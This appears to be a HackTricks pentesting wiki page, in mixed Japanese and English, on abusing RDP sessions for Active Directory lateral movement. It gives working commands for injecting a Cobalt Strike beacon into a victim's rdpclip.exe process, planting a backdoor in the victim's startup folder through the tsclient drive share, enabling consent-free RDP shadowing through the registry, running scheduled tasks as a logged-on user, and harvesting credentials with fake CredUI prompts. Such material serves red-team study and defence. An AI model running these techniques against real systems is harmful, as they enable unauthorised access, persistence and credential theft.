# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

もし**外部グループ**が**RDPアクセス**を現在のドメイン内の任意の**コンピュータ**に対して持っている場合、**攻撃者**は**そのコンピュータを侵害してユーザーを待ち構える**ことができます。

そのユーザーがRDPでアクセスした後、**攻撃者はそのユーザーのセッションにピボットして**外部ドメインでその権限を悪用できます。
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Check **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

ユーザーが**RDP into a machine**にアクセスし、その場所で**attacker**が**waiting**している場合、攻撃者は**inject a beacon in the RDP session of the user**ことができ、RDPでアクセスしたときに**victim mounted his drive**していれば、**attacker could access it**。

この場合、**statup folder**に**backdoor**を書き込むだけで、**victims**の**original computer**を**compromise**できます。
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

ホスト上であなたが**local admin**で、被害者がすでに**active RDP session**を持っている場合、**view/control that desktop without stealing the password or dumping LSASS**ことができるかもしれません。

これは以下に格納されている**Remote Desktop Services shadowing**ポリシーによります:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
興味深い値:

- `0`: 無効
- `1`: `EnableInputNotify` (制御、ユーザー承認が必要)
- `2`: `EnableInputNoNotify` (制御、**ユーザー承認不要**)
- `3`: `EnableNoInputNotify` (表示のみ、ユーザー承認が必要)
- `4`: `EnableNoInputNoNotify` (表示のみ、**ユーザー承認不要**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
これは、権限の高いユーザーがRDPで接続したままロック解除されたデスクトップ、KeePassセッション、MMCコンソール、ブラウザセッション、またはadmin shellを開いたままにしている場合に特に有用です。

## ログオン中のユーザーとしてのスケジュールされたタスク

もしあなたが**local admin**でターゲットユーザーが**currently logged on**している場合、Task Schedulerはパスワードなしで**as that user without their password**としてコードを実行できます。

これにより、被害者の既存のログオンセッションが実行プリミティブになります:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
注意:

- ユーザーが **ログオンしていない** 場合、Windows は通常、そのユーザーとして実行されるタスクを作成するためにパスワードを要求します。
- ユーザーが **ログオンしている** 場合、タスクは既存のログオン コンテキストを再利用できます。
- これは、LSASS に触れることなく被害者のセッション内で GUI 操作を実行したりバイナリを起動したりする実用的な方法です。

## 被害者セッション内での CredUI プロンプトの悪用

被害者のインタラクティブデスクトップ内で実行できるようになると（たとえば **Shadow RDP** や **そのユーザーとして実行されるスケジュールされたタスク** を介して）、CredUI API を使って **本物の Windows 資格情報プロンプト** を表示し、被害者が入力した資格情報を収集できます。

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

典型的なフロー:

1. 被害者のセッション内でバイナリを起動する。
2. 現在のドメインのブランディングに一致するドメイン認証プロンプトを表示する。
3. 返された認証バッファをアンパックする。
4. 提供された資格情報を検証し、必要に応じて有効な資格情報が入力されるまでプロンプトを繰り返す。

これは、プロンプトが偽の HTML フォームではなく標準の Windows API によってレンダリングされるため、**on-host phishing** に有用です。

## 被害者コンテキストでの PFX 取得

同じ **scheduled-task-as-user** プリミティブを使用して、**ログオン中の被害者としての証明書/PFX** を要求できます。取得した証明書は後でそのユーザーとしての **AD 認証** に使用でき、パスワードの窃取を完全に回避できます。

高レベルの流れ:

1. 被害者がログオンしているホスト上で **local admin** を獲得する。
2. スケジュールタスクを使用して被害者として登録/エクスポート処理を実行する。
3. 生成された **PFX** をエクスポートする。
4. PFX を PKINIT / 証明書ベースの AD 認証に使用する。

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## 参考資料

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
